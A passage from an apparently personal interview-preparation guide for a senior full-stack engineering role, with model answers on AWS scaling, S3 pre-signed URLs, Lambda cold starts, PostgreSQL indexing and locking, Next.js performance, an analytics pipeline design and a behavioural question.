- Fix: Call `revalidatePath('/products/123')` from your CMS webhook or admin action

**Point 5 — Stale DNS (rare but possible):**
- If the origin's IP changed recently, old DNS A records may still be cached
- Check: `nslookup yourdomain.com` from EU DNS resolver
- Fix: Lower TTL before IP changes; use AWS Route53 health checks

**Programmatic CDN purge integration:**
```js
// Trigger from your CMS publish webhook
async function purgeProduct(productId) {
  const cloudfront = new AWS.CloudFront();
  await cloudfront.createInvalidation({
    DistributionId: process.env.CF_DISTRIBUTION_ID,
    InvalidationBatch: {
      CallerReference: Date.now().toString(),
      Paths: { Quantity: 1, Items: [`/products/${productId}`] }
    }
  }).promise();
}
```

---

**STUDY REFERENCES:**
- **AWS Docs:** [CloudFront invalidating files](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/Invalidation.html)
- **MDN:** [Age header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Age)
- **MDN:** [Cache-Control](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control) — `s-maxage` (CDN-specific), `stale-while-revalidate`
- **AWS Docs:** [CloudFront Origin Shield](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/origin-shield.html)
- **Related topics:** CDN cache keys (vary by cookie, header, query string), CloudFront Functions for cache key normalization, Fastly/Varnish VCL

---

## ═══════════════════════════════════════
## ROUND 5 — AWS ARCHITECTURE
## ═══════════════════════════════════════

---

### Q13 — 10K to 100K Request Spike — RDS Bottleneck

**QUESTION:**
> Your Next.js app on EC2 behind an ALB handles 10K req/s normally but spikes to 100K. RDS PostgreSQL becomes the bottleneck. Walk through your scaling strategy.

---

**ANSWER:**

**The problem:** RDS PostgreSQL has a hard connection limit (e.g., `db.r5.large` = ~500 connections max). At 100K req/s with 10 EC2 instances each opening 50 DB connections = 500 connections → connection pool exhausted → requests queue or timeout.

**Layer 1 — Connection Pooling (immediate, free fix):**
Deploy **PgBouncer** or **RDS Proxy** between your EC2 instances and RDS:
- PgBouncer: multiplexes thousands of app connections to ~50 actual DB connections
- RDS Proxy: AWS-managed, integrates with IAM, automatic failover
- Result: 10,000 app requests can share 50 DB connections via transaction-mode pooling

**Layer 2 — Read Replicas for read traffic:**
- Add 2-3 RDS Read Replicas
- Route all `SELECT` queries to replicas, `INSERT/UPDATE/DELETE` to primary
- In Node.js with TypeORM/Prisma: configure separate read/write data sources
- At 10K→100K, reads typically dominate (80-90%)

**Layer 3 — ElastiCache (Redis/Memcached) for query caching:**
- Identify the top 20 heaviest and most repeated queries
- Cache their results in Redis with appropriate TTL
- A product page that hits DB on every request at 100K req/s → 100K DB calls. With cache hit rate 95% → 5K DB calls
- Use `cache-aside` pattern: check Redis first, fall back to DB, populate Redis

**Layer 4 — ALB + Auto Scaling Group:**
- ALB already handles horizontal scaling at the web tier
- Configure ASG to scale EC2 instances on CPU/request-count CloudWatch alarms
- Target tracking policy: maintain 60% CPU utilization

**Layer 5 — Database sharding / Aurora Serverless v2 (strategic):**
- Aurora Serverless v2 auto-scales compute instantly (ACUs: Aurora Capacity Units)
- For true 100K req/s sustained, move from single RDS to Aurora Cluster
- Aurora can have up to 15 read replicas vs RDS's 5

**Architecture diagram:**
```
Internet → Route53 → CloudFront → ALB → ASG (EC2, Next.js)
                                              ↓
                                        RDS Proxy / PgBouncer
                                              ↓
                               Aurora Primary ← Aurora Replica x3
                                    ↑
                               ElastiCache Redis
```

---

**STUDY REFERENCES:**
- **AWS Docs:** [RDS Proxy](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/rds-proxy.html)
- **AWS Docs:** [Aurora Auto Scaling](https://docs.aws.amazon.com/AmazonRDS/latest/AuroraUserGuide/Aurora.Integrating.AutoScaling.html)
- **AWS Docs:** [ElastiCache for Redis](https://docs.aws.amazon.com/AmazonElastiCache/latest/red-ug/WhatIs.html)
- **PgBouncer Docs:** [https://www.pgbouncer.org/](https://www.pgbouncer.org/)
- **AWS Blog:** "Scaling to 100K connections with RDS Proxy"
- **Related topics:** Connection pool sizing formula (`(core_count * 2) + effective_spindle_count`), read replica lag, WAL (Write-Ahead Log), Aurora Global Database

---

### Q14 — S3 Private File Security

**QUESTION:**
> You're serving user-uploaded private documents via S3. Junior dev says "make bucket public, check permissions in app." What are the 3 things wrong with this and what's the correct solution?

---

**ANSWER:**

**3 things wrong with "public bucket + app-layer check":**

1. **Direct URL access bypasses your app entirely.** If `alice.pdf` is at `https://bucket.s3.amazonaws.com/docs/alice.pdf`, anyone who knows or guesses the URL can download it — no request ever reaches your Node.js app. S3 serves it directly from its CDN. Your permission check is never called.

2. **S3 URLs are discoverable.** S3 object keys are often predictable (`user-123/document.pdf`) or can be enumerated via tools. A public bucket is a data breach waiting to happen. AWS regularly sends "Public Bucket" warnings for this reason.

3. **Compliance and regulatory violation.** HIPAA, PCI-DSS, GDPR, SOC2 all require data-at-rest to be access-controlled at the storage layer, not just the application layer. "Defense in depth" is a compliance requirement. Auditors will flag this immediately.

**Correct AWS-native solution — Pre-signed URLs:**
```js
// Node.js using AWS SDK v3
import { GetObjectCommand, S3Client } from '@aws-sdk/client-s3';
import { getSignedUrl } from '@aws-sdk/s3-request-presigner';

const s3 = new S3Client({ region: 'us-east-1' });

async function getDownloadUrl(userId, fileKey) {
  // 1. First check in YOUR database that userId owns fileKey
  const file = await db.query(
    'SELECT * FROM documents WHERE key = $1 AND owner_id = $2',
    [fileKey, userId]
  );
  if (!file) throw new Error('Forbidden');

  // 2. Generate a time-limited signed URL
  const command = new GetObjectCommand({
    Bucket: 'private-docs-bucket',
    Key: fileKey,
  });
  
  const url = await getSignedUrl(s3, command, { expiresIn: 300 }); // 5 min
  return url;
}
```

**S3 Bucket Policy — Block all public access:**
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Deny",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::private-docs-bucket/*",
    "Condition": {
      "StringNotEquals": {
        "aws:PrincipalArn": "arn:aws:iam::ACCOUNT:role/AppServerRole"
      }
    }
  }]
}
```

**Additional security layers:**
- Enable S3 Block Public Access at account level (prevent any future accidental public bucket)
- Enable S3 Server-Side Encryption (SSE-S3 or SSE-KMS)
- Enable S3 Access Logging and CloudTrail for audit trail
- For sensitive documents: add a `Content-Disposition: attachment` header so pre-signed URL forces download, not inline rendering

---

**STUDY REFERENCES:**
- **AWS Docs:** [S3 Presigned URLs](https://docs.aws.amazon.com/AmazonS3/latest/userguide/ShareObjectPreSignedURL.html)
- **AWS Docs:** [S3 Block Public Access](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html)
- **AWS Security Blog:** "How to prevent uploads to public S3 buckets"
- **OWASP:** [Broken Access Control — A01:2021](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- **Related topics:** S3 Bucket Policies vs ACLs (ACLs deprecated), IAM roles for EC2 (no hardcoded credentials), S3 Object Lambda for transforming content on download

---

### Q15 — Lambda Cold Start

**QUESTION:**
> You migrated an API route to Lambda. P99 latency went from 120ms to 800ms. Diagnose and fix. What's the difference between provisioned and reserved concurrency?

---

**ANSWER:**

**Root cause diagnosis:**
The 800ms P99 but normal average latency is the classic **cold start** signature. Lambda cold start means:
1. AWS needs to provision a new container
2. Download and unzip your deployment package
3. Initialize the Node.js runtime
4. Run your module-level code (DB connections, imports, etc.)
5. THEN execute your handler

For a Node.js Lambda with dependencies, this can take 500-2000ms. The P99 is high because 1 in 100 requests hits a cold container.

**Diagnosis steps:**
```
CloudWatch Logs Insights:
fields @timestamp, @duration, @initDuration, @billedDuration
| filter @type = "REPORT"
| filter @initDuration > 0  -- Cold starts only
| stats avg(@initDuration), max(@initDuration), count()
```
`@initDuration > 0` in CloudWatch = cold start. If you see hundreds of these, you have a cold start problem.

**Fixes:**

**Fix 1 — Reduce package size:**
- Tree-shake unused imports: `import { S3Client } from '@aws-sdk/client-s3'` not `import AWS from 'aws-sdk'`
- Use esbuild/Rollup to bundle — eliminates `node_modules` directory entirely
- Target: keep deployment package under 5MB. Each MB adds ~10ms cold start

**Fix 2 — Move initialization outside handler:**
```js
// BAD — creates DB connection on every cold start (slow) AND warm invocation (very wrong)
exports.handler = async (event) => {
  const db = await createConnection(); // 200ms
  return db.query(...)
}

// GOOD — connection reused across warm invocations
const dbPromise = createConnection(); // runs once per container
exports.handler = async (event) => {
  const db = await dbPromise; // instant on warm invocations
  return db.query(...)
}
```

**Fix 3 — Provisioned Concurrency:**
Pre-warms a specified number of Lambda instances — they're always initialized and ready:
```bash
aws lambda put-provisioned-concurrency-config \
  --function-name my-api \
  --qualifier prod \
  --provisioned-concurrent-executions 10
```
Cost: You pay for provisioned concurrency even when idle. Use for P99 SLA-critical endpoints.

**Provisioned vs Reserved Concurrency:**

| Feature | Provisioned Concurrency | Reserved Concurrency |
|---|---|---|
| **Purpose** | Eliminate cold starts | Limit/guarantee max concurrency |
| **Pre-warms instances?** | YES — always initialized | NO |
| **Affects cold starts?** | YES — eliminates them | NO — cold starts still occur |
| **Cost** | Extra cost even when idle | No extra cost |
| **Use for** | Latency-sensitive APIs | Protecting downstream services from Lambda overload; ensuring Lambda isn't starved by other functions |

**Fix 4 — Use Lambda SnapStart (Java, now Node.js Preview):**
Takes a snapshot of initialized function state. Restores instead of initializing from scratch. Reduces cold start by 90%+.

---

**STUDY REFERENCES:**
- **AWS Docs:** [Lambda Provisioned Concurrency](https://docs.aws.amazon.com/lambda/latest/dg/provisioned-concurrency.html)
- **AWS Docs:** [Lambda performance optimization](https://docs.aws.amazon.com/lambda/latest/dg/best-practices.html)
- **AWS Blog:** "Operating Lambda: Performance optimization" — 3-part series
- **Lumigo Blog:** "Lambda cold starts: causes and solutions" — detailed benchmarks
- **Related topics:** Lambda SnapStart, Lambda layers (shared dependencies), AWS Lambda Power Tuning tool (open source), ARM/Graviton Lambda (cheaper, faster cold starts)

---

## ═══════════════════════════════════════
## ROUND 6 — POSTGRESQL / SQL SERVER
## ═══════════════════════════════════════

---

### Q16 — Slow Query Optimization

**QUESTION:**
> This query takes 12 seconds on 50M rows:
> `SELECT * FROM orders WHERE customer_id = 42 AND status = 'pending' ORDER BY created_at DESC LIMIT 20;`
> Walk through your optimization process.

---

**ANSWER:**

**Step 1 — Run `EXPLAIN ANALYZE` (not just `EXPLAIN`):**
```sql
EXPLAIN (ANALYZE, BUFFERS, FORMAT TEXT)
SELECT * FROM orders 
WHERE customer_id = 42 AND status = 'pending' 
ORDER BY created_at DESC 
LIMIT 20;
```

**What `EXPLAIN ANALYZE` tells you that `EXPLAIN` alone doesn't:**
- `EXPLAIN`: shows the **planned** execution path (estimated rows, cost)
- `EXPLAIN ANALYZE`: **actually executes** the query and shows real timing, real row counts
- `BUFFERS`: shows cache hits vs disk reads — critical for understanding I/O
- Key things to look for: `Seq Scan` (table scan = bad), `Rows Removed by Filter` (filter happening after full scan = very bad), `Sort` (potentially expensive if not index-backed)

**Likely output for this query (unoptimized):**
```
Seq Scan on orders (cost=0.00..890123.00 rows=243 width=...
  Filter: ((customer_id = 42) AND (status = 'pending'))
  Rows Removed by Filter: 49998432
Sort: created_at DESC
  Sort Method: quicksort Memory: 25kB
```
This means PostgreSQL is scanning all 50M rows, filtering on each one. Horror.

**Step 2 — Create composite index:**
```sql
-- Index covering the WHERE and ORDER BY clauses
CREATE INDEX CONCURRENTLY idx_orders_customer_status_date 
ON orders (customer_id, status, created_at DESC);
```

**Why this index works:**
- `customer_id` first — highest selectivity (filters from 50M → ~1000 rows per customer)
- `status` second — further filters to pending
- `created_at DESC` last — matches the sort direction, avoids a separate sort step
- `CONCURRENTLY` — creates index without locking the table (production-safe)

**Step 3 — Verify with EXPLAIN ANALYZE after index:**
```
Index Scan using idx_orders_customer_status_date on orders
  Index Cond: ((customer_id = 42) AND (status = 'pending'))
  Limit: 20
```
Query now returns in <5ms.

**Additional consideration — `SELECT *` trap:**
Never use `SELECT *` in production queries against large tables. You're fetching every column including potentially large text/JSONB fields. Use explicit column list. For this LIMIT 20 use case, consider a **covering index** that includes all needed columns — PostgreSQL can satisfy the query entirely from the index without a heap fetch (index-only scan).

**Statistics tip:**
```sql
-- Ensure PostgreSQL has fresh statistics for the query planner
ANALYZE orders;
-- Or check existing stats
SELECT * FROM pg_stats WHERE tablename = 'orders' AND attname = 'customer_id';
```

---

**STUDY REFERENCES:**
- **PostgreSQL Docs:** [EXPLAIN](https://www.postgresql.org/docs/current/sql-explain.html) — official reference
- **PostgreSQL Docs:** [Indexes](https://www.postgresql.org/docs/current/indexes.html) — composite, covering, partial indexes
- **Depesz EXPLAIN analyzer:** [https://explain.depesz.com/](https://explain.depesz.com/) — paste EXPLAIN output for visual analysis
- **Use the Index, Luke:** [https://use-the-index-luke.com/](https://use-the-index-luke.com/) — the bible of SQL indexing
- **Related topics:** Partial indexes (`WHERE status = 'pending'`), index bloat and VACUUM, `pg_stat_statements` extension for identifying slow queries in production, query planner statistics

---

### Q17 — N+1 Problem

**QUESTION:**
> Your Node.js API fetches 100 posts and for each post fetches the author. You see 101 queries. Fix it in raw SQL, in an ORM, and architecturally.

---

**ANSWER:**

**The N+1 anti-pattern:**
```js
// This makes 1 query for posts, then 1 query PER POST for author = 101 queries
const posts = await db.query('SELECT * FROM posts LIMIT 100'); // Query 1
for (const post of posts) {
  post.author = await db.query(  // Queries 2-101
    'SELECT * FROM users WHERE id = $1', [post.author_id]
  );
}
```

**Fix 1 — Raw SQL (JOIN):**
```sql
SELECT 
  p.id, p.title, p.content, p.created_at,
  u.id AS author_id, u.name AS author_name, u.email AS author_email
FROM posts p
INNER JOIN users u ON u.id = p.author_id
ORDER BY p.created_at DESC
LIMIT 100;
```
1 query, database does the join efficiently using indexes. Result: 1ms instead of 200ms.

**Fix 2 — Raw SQL (2-query approach for complex cases):**
Sometimes joins cause large result sets (1 post × 10 tags = 10 rows per post). Use 2 targeted queries instead:
```js
const posts = await db.query('SELECT * FROM posts LIMIT 100');
const authorIds = [...new Set(posts.map(p => p.author_id))];
const authors = await db.query(
  'SELECT * FROM users WHERE id = ANY($1)', [authorIds]  // 1 query, IN clause
);
const authorMap = Object.fromEntries(authors.map(a => [a.id, a]));
posts.forEach(p => p.author = authorMap[p.author_id]);
```
2 queries regardless of post count. The `ANY($1)` with array parameter is PostgreSQL's efficient `IN` equivalent.

**Fix 3 — ORM (Prisma):**
```js
// Prisma — eager loading with include
const posts = await prisma.post.findMany({
  take: 100,
  include: {
    author: {
      select: { id: true, name: true, email: true }
    }
  }
});
// Prisma issues 2 queries: one for posts, one for all authors
```

**Fix 4 — ORM (TypeORM):**
```js
// TypeORM — QueryBuilder with LEFT JOIN
const posts = await postRepository
  .createQueryBuilder('post')
  .leftJoinAndSelect('post.author', 'author')
  .select(['post.id', 'post.title', 'author.id', 'author.name'])
  .take(100)
  .getMany();
```

**Architectural fix — DataLoader pattern (Facebook's solution, used in GraphQL):**
```js
import DataLoader from 'dataloader';

const userLoader = new DataLoader(async (userIds) => {
  const users = await db.query('SELECT * FROM users WHERE id = ANY($1)', [userIds]);
  return userIds.map(id => users.find(u => u.id === id));
});

// In resolvers — each individual call is batched automatically
const post1Author = await userLoader.load(post1.author_id); // batched
const post2Author = await userLoader.load(post2.author_id); // same batch
// Result: 1 query for all authors combined
```
DataLoader batches all `.load()` calls made in the same tick into a single query. Ideal for GraphQL APIs.

**Tradeoff of each:**
- JOIN: simplest, best for simple relationships, can get complex with multiple associations
- 2-query: more control, avoids cartesian product with multiple relations
- ORM include: convenient but can over-fetch; always use `select` to limit columns
- DataLoader: best for dynamic queries (GraphQL), adds complexity for simple REST APIs

---

**STUDY REFERENCES:**
- **PostgreSQL Docs:** [JOIN types](https://www.postgresql.org/docs/current/queries-table-expressions.html#QUERIES-JOIN)
- **Prisma Docs:** [Select fields and include relations](https://www.prisma.io/docs/concepts/components/prisma-client/select-fields)
- **DataLoader GitHub:** [https://github.com/graphql/dataloader](https://github.com/graphql/dataloader) — Facebook's batching library
- **Stack Overflow:** "N+1 query problem explained" — canonical answer by Bill Karwin
- **Related topics:** Eager vs lazy loading in ORMs, SQL `IN` vs `ANY` performance, cursor-based pagination to avoid OFFSET, query analysis with `pg_stat_statements`

---

### Q18 — Transaction Isolation Race Condition

**QUESTION:**
> Two concurrent requests both try to deduct from a user's account balance. Your code reads, calculates, writes. Under what isolation level does this cause a race condition and what's the correct fix?

---

**ANSWER:**

**The race condition — "Lost Update":**
```js
// Both requests run concurrently:
async function deductBalance(userId, amount) {
  const { balance } = await db.query('SELECT balance FROM accounts WHERE id = $1', [userId]);
  // Request A reads: 100. Request B ALSO reads: 100
  const newBalance = balance - amount; // A: 100-30=70, B: 100-50=50
  await db.query('UPDATE accounts SET balance = $1 WHERE id = $2', [newBalance, userId]);
  // A writes 70, then B writes 50 — 80 total was deducted but 50 is final. 30 was lost!
}
```

**Which isolation level allows this:**
- **READ COMMITTED** (PostgreSQL default): Each statement sees committed data at statement start. Allows Lost Update when using read-modify-write pattern as shown above
- **REPEATABLE READ**: Prevents dirty reads and non-repeatable reads, but does NOT prevent Lost Update in all implementations
- **SERIALIZABLE**: Would prevent this — but has performance overhead

**Correct fixes:**

**Fix 1 — Atomic UPDATE (best for simple cases):**
```sql
-- Single atomic operation — no race condition possible
UPDATE accounts 
SET balance = balance - $1
WHERE id = $2 AND balance >= $1  -- Check insufficient funds atomically
RETURNING balance;

-- If 0 rows returned → insufficient funds (balance was less than amount)
```
The database lock acquired during the UPDATE prevents any concurrent UPDATE from running simultaneously. This is the simplest and most performant fix.

**Fix 2 — SELECT FOR UPDATE (pessimistic locking):**
```js
async function deductBalanceSafe(userId, amount) {
  await db.query('BEGIN');
  try {
    // Lock the row for this transaction — other transactions WAIT
    const { balance } = await db.query(
      'SELECT balance FROM accounts WHERE id = $1 FOR UPDATE', [userId]
    );
    if (balance < amount) throw new Error('Insufficient funds');
    await db.query(
      'UPDATE accounts SET balance = $1 WHERE id = $2', [balance - amount, userId]
    );
    await db.query('COMMIT');
  } catch (e) {
    await db.query('ROLLBACK');
    throw e;
  }
}
```
`SELECT FOR UPDATE` holds an exclusive row lock until the transaction commits. Other concurrent transactions wait. Good for complex read-modify-write logic where you need to validate before writing.

**Fix 3 — Optimistic Locking (good for high-read, low-write scenarios):**
```sql
-- Add version column to table
ALTER TABLE accounts ADD COLUMN version INTEGER DEFAULT 0;

-- In application:
SELECT balance, version FROM accounts WHERE id = $1;
-- ... compute new balance ...
UPDATE accounts SET balance = $1, version = version + 1
WHERE id = $2 AND version = $3;  -- Fails if another transaction already updated
-- If 0 rows affected → retry the transaction
```
No locking overhead on reads. Write fails and retries if another write happened first. Best for systems where conflicts are rare.

**Senior-level point:** For financial systems, always use Fix 1 (atomic UPDATE) or Fix 2 (SELECT FOR UPDATE). Never use the read-modify-write pattern without database-level protection. Also: use `SERIALIZABLE` isolation for entire transaction batches where correctness > performance.

---

**STUDY REFERENCES:**
- **PostgreSQL Docs:** [Transaction Isolation](https://www.postgresql.org/docs/current/transaction-iso.html) — READ COMMITTED vs SERIALIZABLE
- **PostgreSQL Docs:** [SELECT FOR UPDATE](https://www.postgresql.org/docs/current/sql-select.html#SQL-FOR-UPDATE-SHARE)
- **Martin Fowler:** [Patterns of Enterprise Application Architecture — Optimistic Offline Lock](https://martinfowler.com/eaaCatalog/optimisticOfflineLock.html)
- **PostgreSQL Wiki:** [Lock Types](https://wiki.postgresql.org/wiki/Lock_Monitoring)
- **Related topics:** Deadlocks and detection, `NOWAIT` and `SKIP LOCKED` for queue patterns, `pg_locks` view, 2-Phase Commit for distributed transactions

---

## ═══════════════════════════════════════
## ROUND 7 — PERFORMANCE OPTIMIZATION
## ═══════════════════════════════════════

---

### Q19 — Core Web Vitals Fixes

**QUESTION:**
> LCP is 4.8s, CLS is 0.25, INP is 380ms. For each metric, name the top 2 causes specific to Next.js and the exact fix.

---

**ANSWER:**

**LCP (Largest Contentful Paint) — 4.8s (target: <2.5s)**
> Measures when the largest visible content element (usually hero image or H1) becomes visible

*Cause 1: Hero image not preloaded / using wrong Next.js Image props*
```jsx
// WRONG — image discovered late, no priority hint
<img src="/hero.jpg" />

// CORRECT — Next.js Image with priority (adds <link rel="preload">)
<Image 
  src="/hero.jpg" 
  priority={true}  // Adds preload link in <head>, prevents lazy loading
  sizes="(max-width: 768px) 100vw, 50vw"
  fill
/>
```

*Cause 2: Blocking render by large JavaScript chunks*
```js
// next.config.js — analyze your bundle
const withBundleAnalyzer = require('@next/bundle-analyzer')({ enabled: true });
// Fix: code-split heavy components
const HeavyChart = dynamic(() => import('./HeavyChart'), {
  loading: () => <ChartSkeleton />,
  ssr: false
});
```

---

**CLS (Cumulative Layout Shift) — 0.25 (target: <0.1)**
> Measures unexpected layout movement — elements jumping around after paint

*Cause 1: Images without explicit dimensions*
```jsx
// WRONG — browser doesn't know image height until loaded → layout shift
<img src="/banner.jpg" />

// CORRECT — explicit dimensions reserve space
<Image src="/banner.jpg" width={1200} height={400} alt="..." />
// Or use aspect-ratio CSS:
// aspect-ratio: 1200/400; width: 100%;
```

*Cause 2: Fonts causing FOUT (Flash of Unstyled Text)*
```js
// next/font automatically handles font loading with no layout shift
import { Inter } from 'next/font/google';
const inter = Inter({ 
  subsets: ['latin'],
  display: 'swap',  // or 'optional' to avoid FOUT entirely
  preload: true,
});
```
Also: Use `font-display: optional` for non-critical fonts — browsers use cached font, no shift.

---

**INP (Interaction to Next Paint) — 380ms (target: <200ms)**
> Measures responsiveness — from user interaction (click/tap) to next visual update

*Cause 1: Heavy event handlers blocking the main thread*
```js
// WRONG — synchronous heavy computation in click handler
button.addEventListener('click', () => {
  const result = processGiantArray(million_items); // blocks for 300ms
  updateUI(result);
});

// CORRECT — defer computation with scheduler API or setTimeout
button.addEventListener('click', async () => {
  updateUI({ loading: true }); // immediate visual feedback
  const result = await scheduler.postTask(() => processGiantArray(items), 
    { priority: 'background' });
  updateUI(result);
});
```

*Cause 2: Re-rendering too many React components on interaction*
```js
// Profile with React DevTools Profiler
// Common cause: state update at top of tree triggers re-render of 500+ components

// Fix 1: Move state down
// Fix 2: useMemo/useCallback for expensive computations
const expensiveValue = useMemo(() => computeHeavy(data), [data]);

// Fix 3: React.memo for pure components
const ListItem = React.memo(({ item }) => <div>{item.name}</div>);
```

---

**STUDY REFERENCES:**
- **Google Web.dev:** [Web Vitals](https://web.dev/vitals/) — official definitions and thresholds
- **Google Web.dev:** [Optimize LCP](https://web.dev/optimize-lcp/) | [Optimize CLS](https://web.dev/optimize-cls/) | [Optimize INP](https://web.dev/optimize-inp/)
- **Next.js Docs:** [Image Optimization](https://nextjs.org/docs/app/getting-started/images) | [Font Optimization](https://nextjs.org/docs/app/getting-started/fonts)
- **Chrome DevTools:** Performance panel → Core Web Vitals overlay
- **Related topics:** `preconnect` hints, `fetchpriority` attribute, `content-visibility: auto`, React Profiler, `useTransition` hook for deferring non-urgent updates

---

### Q20 — Bundle Bloat — Preventing Transitive Dependencies

**QUESTION:**
> You remove `moment.js` (68KB). Two weeks later it's back as a transitive dependency. How do you prevent this permanently at CI/CD level?

---

**ANSWER:**

**Why it comes back:** A new npm package you installed depends on `moment.js` in its own `package.json`. npm/yarn installs it automatically. It's now in your `node_modules` and included in your bundle — but you never explicitly added it.

**Permanent prevention at CI/CD level:**

**Solution 1 — Bundle size budgets in CI (best approach):**
```js
// next.config.js — experimental bundle analysis
const withBundleAnalyzer = require('@next/bundle-analyzer')({
  enabled: process.env.ANALYZE === 'true',
});

// Add size-limit package
// package.json
{
  "scripts": {
    "size": "size-limit",
    "analyze": "ANALYZE=true next build"
  },
  "size-limit": [
    { "path": ".next/static/chunks/pages/index*.js", "limit": "150 kB" },
    { "path": ".next/static/chunks/main*.js", "limit": "80 kB" }
  ]
}
```
CI pipeline runs `npm run size` — fails the build if any chunk exceeds budget.

**Solution 2 — `bundlewatch` in CI:**
```yaml
# GitHub Actions
- name: Check bundle size
  run: npx bundlewatch --config bundlewatch.config.js
  env:
    BUNDLEWATCH_GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
# bundlewatch.config.js
module.exports = {
  files: [{ path: '.next/static/**/*.js', maxSize: '200kb' }]
};
```
Posts a comment on the PR showing size diff vs main branch.

**Solution 3 — Webpack alias to stub moment (nuclear option):**
```js
// next.config.js
module.exports = {
  webpack: (config) => {
    config.resolve.alias['moment'] = false; // Throws build error if any code imports moment
    return config;
  }
};
```
If any dependency (including transitive) tries to import `moment`, the build fails immediately with a clear error.

**Solution 4 — Import cost VS Code extension + PR review checklist:**
Install the "Import Cost" VS Code extension — shows inline KB cost of each import. Add to PR template: "Run `npm run analyze`, screenshot attached."

**Solution 5 — `npm why moment` for diagnosis:**
```bash
npm why moment
# Shows the full dependency chain that brought it in
# e.g.: mypackage@1.0.0 → heavy-date-lib@2.0.0 → moment@2.29.0
```
Then switch `heavy-date-lib` to a moment-free alternative.

---

**STUDY REFERENCES:**
- **size-limit:** [https://github.com/ai/size-limit](https://github.com/ai/size-limit) — GitHub-integrated size budgets
- **bundlewatch:** [https://bundlewatch.io/](https://bundlewatch.io/)
- **bundlephobia:** [https://bundlephobia.com/](https://bundlephobia.com/) — check any package's size and alternatives before installing
- **Next.js Docs:** [Bundle analyzer](https://nextjs.org/docs/app/guides/package-bundling)
- **Related topics:** Tree-shaking, `sideEffects: false` in package.json, webpack externals, dynamic imports for code splitting, `date-fns` as moment.js replacement (tree-shakeable)

---

## ═══════════════════════════════════════
## ROUND 8 — SYSTEM DESIGN
## ═══════════════════════════════════════

---

### Q21 — Design Adobe Analytics Event Pipeline

**QUESTION:**
> Design a system that ingests 1M page-view events/second globally, processes them near-real-time, and makes data queryable within 5 seconds.

---

**ANSWER:**

**Clarifying assumptions:**
- Event payload: ~500 bytes (user ID, page URL, timestamp, properties)
- 1M events/sec = ~500MB/sec ingestion rate
- Query patterns: aggregate (count by page, funnel analysis), not individual event lookup
- Retention: hot data 30 days, cold data 2 years

**Architecture:**

```
[Client SDKs (JS, iOS, Android)]
          ↓ HTTPS batch (100 events/request)
[AWS API Gateway + Lambda (Edge ingestion)] → 
[AWS Kinesis Data Streams (128 shards × 1MB/s = 128MB/s)]
          ↓                              ↓
[Kinesis Firehose → S3 (raw events)]  [Kinesis Consumer (Lambda/Flink)]
          ↓                              ↓ (stream processing)
[S3 → Glue ETL → Redshift]          [DynamoDB (real-time counters)]
          ↓                              ↓ (< 5 seconds)
     [Athena/QuickSight]            [Real-time dashboard API]
```

**Ingestion layer:**
- Client SDK batches events (100 at a time), sends to regional API Gateway endpoints
- API Gateway → Lambda validates, deduplicates by event ID, forwards to Kinesis
- Kinesis Streams: 128 shards × 1MB/s = 128MB/s throughput. Each shard: ordered, 7-day retention

**Stream processing (< 5 second latency):**
- Kinesis Consumer (Apache Flink / AWS Kinesis Data Analytics) reads events in micro-batches every 1 second
- Aggregates: `COUNT(*) GROUP BY page_id, 1-minute window`
- Writes aggregates to DynamoDB: `{page_id}#{minute_timestamp}` → count
- API reads from DynamoDB for real-time dashboards (sub-second query)

**Batch processing (historical queries):**
- Kinesis Firehose buffers 60 seconds of events, writes Parquet to S3 (partitioned by date/hour)
- AWS Glue crawls S3, updates Athena catalog
- Complex queries (funnel analysis, cohorts) run on Athena or Redshift Spectrum against S3

**Where PostgreSQL fits vs columnar store:**
- PostgreSQL: NOT suited for this. 1M events/sec → 86B events/day. PostgreSQL would need extreme sharding (Citus), adding operational complexity. It's optimized for transactional workloads, not analytical
- **Columnar store (Redshift, ClickHouse, BigQuery):** Designed for this. Columnar compression means a `SELECT COUNT(*) WHERE page_id = 'home'` reads only 1 column across billions of rows. 100x faster than row store for analytics

**ClickHouse** (what Adobe Analytics likely uses internally): Handles 1M inserts/sec on a single node, sub-second queries on billions of rows.

**Durability & at-least-once delivery:**
- Client retries with event ID for deduplication
- Kinesis 7-day retention → reprocess if downstream fails
- S3 as the "source of truth" for replay

---

**STUDY REFERENCES:**
- **AWS Docs:** [Kinesis Data Streams](https://docs.aws.amazon.com/streams/latest/dev/introduction.html)
- **AWS Docs:** [Kinesis Data Firehose](https://docs.aws.amazon.com/firehose/latest/dev/what-is-this-service.html)
- **ClickHouse Docs:** [https://clickhouse.com/docs/](https://clickhouse.com/docs/) — columnar DB used by many analytics companies
- **Netflix Tech Blog:** [Keystone Real-time Stream Processing Platform](https://netflixtechblog.com/keystone-real-time-stream-processing-platform-a3ee651812a)
- **Meta Engineering:** [Scribe — distributed logging](https://engineering.fb.com/2019/10/07/core-data/scribe/)
- **Related topics:** Lambda architecture vs Kappa architecture, Apache Kafka vs Kinesis tradeoffs, time-series databases (TimescaleDB, InfluxDB), OLTP vs OLAP

---

## ═══════════════════════════════════════
## ROUND 9 — BEHAVIORAL (ADOBE HM ROUND)
## ═══════════════════════════════════════

---

### Q22 — Disagreeing with Senior Engineer

**QUESTION:**
> Tell me about a time you disagreed with a technical decision made by a more senior engineer.

---

**ANSWER FRAMEWORK (STAR Method):**

**Situation:** "At [company], our team was evaluating whether to use a single monolithic Next.js app or split into micro-frontends for our main customer portal."

**Task:** "The senior architect wanted micro-frontends with module federation, citing scalability. I believed this was over-engineering for our current team size of 8 engineers."

**Action:** "Rather than just objecting in the meeting, I:
1. Researched the actual downsides — micro-frontend complexity adds 40% more infrastructure, separate CI/CD pipelines, cross-app state sharing challenges
2. Built a quick proof-of-concept showing our proposed monolith with well-defined module boundaries (feature-based folder structure, independent deployability via feature flags)
3. Wrote a technical decision record (TDR) comparing both approaches with cost/benefit analysis
4. Presented it to the team as 'here are the tradeoffs, let's decide together' not 'I'm right'"

**Result:** "We aligned on a modular monolith with clear team ownership per domain. 6 months later, we scaled to 20 engineers without architectural issues. The senior engineer acknowledged the staged approach was correct for our scale."

